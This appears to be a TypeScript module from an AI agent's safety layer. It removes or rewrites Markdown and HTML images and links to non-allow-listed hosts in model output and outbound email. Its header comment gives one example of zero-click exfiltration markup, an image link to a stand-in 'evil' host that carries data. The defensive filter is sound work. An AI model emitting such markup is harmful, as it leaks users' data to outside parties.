import { normalizeDomain } from './emailRecipients.ts';

/**
 * Output inspection: rewrites or strips Markdown/HTML images and links that point at hosts that are
 * not allow-listed (classic zero-click exfiltration: ![x](https://evil/p?data=...)).
 * Works on the model's text output AND on outbound email bodies before the gate sees the call.
 * Limits: bare URLs in plain text are left alone (clients usually do not fetch them); exotic markup
 * and other renderers are not covered.
 */
export interface OutputChange {
  kind: 'markdown_image' | 'markdown_link' | 'reference_definition' | 'reference_usage' | 'html_image' | 'html_link' | 'autolink';
  action: 'removed' | 'rewritten';
  url: string;
  host: string;
  reason: string;
  /** offsets in `before` */
  start: number;
  end: number;
  replacement: string;
}

export interface OutputInspection {
  before: string;
  after: string;
  changed: boolean;
  changes: OutputChange[];
  allowedHosts: string[];
}

export const DEFAULT_OUTPUT_ALLOWED_HOSTS = ['example.com', 'company.internal', 'authorized-partner.org'];

function hostCheck(rawUrl: string, allowed: Set<string>): { allowed: boolean; host: string; reason: string } {
  const url = rawUrl.trim().replace(/^<|>$/g, '');
  if (url.startsWith('//')) {
    const host = normalizeDomain(url.slice(2).split(/[/?#]/)[0].split(':')[0]) ?? url.slice(2, 40);
    return { allowed: allowed.has(host), host, reason: allowed.has(host) ? '' : 'protocol-relative URL to a non-allow-listed host' };
  }
  if (/^[a-z][a-z0-9+.-]*:/i.test(url)) {
    let parsed: URL;
    try {
      parsed = new URL(url);
    } catch {
      return { allowed: false, host: '(unparseable)', reason: 'unparseable URL' };
    }
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
      return { allowed: false, host: parsed.protocol, reason: `unsupported scheme ${parsed.protocol}` };
    }
    const host = normalizeDomain(parsed.hostname) ?? parsed.hostname;
    return { allowed: allowed.has(host), host, reason: allowed.has(host) ? '' : 'host is not allow-listed' };
  }
  return { allowed: true, host: '(relative)', reason: '' }; // relative URL: stays inside the app
}

export function inspectOutput(text: string, allowedHosts: string[] = DEFAULT_OUTPUT_ALLOWED_HOSTS): OutputInspection {
  const before = typeof text === 'string' ? text : '';
  const allowed = new Set(allowedHosts.map((h) => normalizeDomain(h)).filter((h): h is string => h !== null));
  const claimed: Array<{ start: number; end: number }> = [];
  const changes: OutputChange[] = [];
  const free = (s: number, e: number) => !claimed.some((c) => s < c.end && e > c.start);

  const add = (m: RegExpMatchArray, kind: OutputChange['kind'], url: string, replacementFor: (host: string) => string, action: OutputChange['action']) => {
    const start = m.index!;
    const end = start + m[0].length;
    if (!free(start, end)) return;
    const chk = hostCheck(url, allowed);
    if (chk.allowed) return;
    claimed.push({ start, end });
    changes.push({ kind, action, url: url.slice(0, 200), host: chk.host, reason: chk.reason, start, end, replacement: replacementFor(chk.host) });
  };

  // reference definitions first so usages can be resolved
  const defs = new Map<string, string>();
  for (const m of before.matchAll(/^[ \t]*\[([^\]\n]+)\]:[ \t]*<?(\S+?)>?(?:[ \t]+.*)?$/gm)) defs.set(m[1].toLowerCase(), m[2]);
  for (const m of before.matchAll(/^[ \t]*\[([^\]\n]+)\]:[ \t]*<?(\S+?)>?(?:[ \t]+.*)?$/gm)) {
    add(m, 'reference_definition', m[2], (h) => `[reference removed: ${h}]`, 'removed');
  }

  // inline images and links
  for (const m of before.matchAll(/(!?)\[([^\]\n]*)\]\(\s*<?([^)\s>]+)>?(?:\s+(?:"[^"]*"|'[^']*'))?\s*\)/g)) {
    if (m[1] === '!') add(m, 'markdown_image', m[3], (h) => `[image removed: ${h}]`, 'removed');
    else add(m, 'markdown_link', m[3], (h) => `${m[2]} (link removed: ${h})`, 'rewritten');
  }
  // reference usages ![alt][ref] / [text][ref]
  for (const m of before.matchAll(/(!?)\[([^\]\n]*)\]\[([^\]\n]*)\]/g)) {
    const ref = (m[3] || m[2]).toLowerCase();
    const url = defs.get(ref);
    if (!url) continue;
    add(m, 'reference_usage', url, (h) => (m[1] === '!' ? `[image removed: ${h}]` : `${m[2]} (link removed: ${h})`), m[1] === '!' ? 'removed' : 'rewritten');
  }
  // HTML
  for (const m of before.matchAll(/<img\b[^>]*?\bsrc\s*=\s*["']?([^"'\s>]+)["']?[^>]*>/gi)) {
    add(m, 'html_image', m[1], (h) => `[image removed: ${h}]`, 'removed');
  }
  for (const m of before.matchAll(/<a\b[^>]*?\bhref\s*=\s*["']?([^"'\s>]+)["']?[^>]*>([\s\S]*?)<\/a>/gi)) {
    add(m, 'html_link', m[1], (h) => `${m[2].replace(/<[^>]+>/g, '')} (link removed: ${h})`, 'rewritten');
  }
  // <https://...> autolinks
  for (const m of before.matchAll(/<((?:https?:)?\/\/[^>\s]+)>/gi)) {
    add(m, 'autolink', m[1], (h) => `(link removed: ${h})`, 'removed');
  }

  changes.sort((a, b) => a.start - b.start);
  let after = '';
  let cursor = 0;
  for (const c of changes) {
    after += before.slice(cursor, c.start) + c.replacement;
    cursor = c.end;
  }
  after += before.slice(cursor);
  return { before, after, changed: changes.length > 0, changes, allowedHosts: Array.from(allowed) };
}
